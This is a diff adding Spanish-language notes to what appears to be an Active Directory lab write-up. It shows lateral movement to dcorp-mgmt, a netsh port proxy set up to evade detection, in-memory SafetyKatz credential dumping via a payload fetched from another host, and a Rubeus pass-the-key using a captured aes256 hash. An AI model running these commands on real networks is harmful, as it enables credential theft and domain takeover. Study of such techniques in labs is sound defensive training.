@@ -411,3 +411,18 @@ Y nos la copiamos a dcorp-mgnt
 ```shell
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
+
+Ahora haremos un renvió de puertos en dcorp-mgnt para evitar la detección en este
+```shell
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97"
+```
+
+Ahora para ejecutar SafetyKatz y poder ejecutarlo en la memoria 
+```shell
+$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
+```
+
+Obteniendo las credenciales de svcadmin, ahora con Rubeus le pasaremos el hash aes256 y se nos permitira conectarnos vias winrm
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
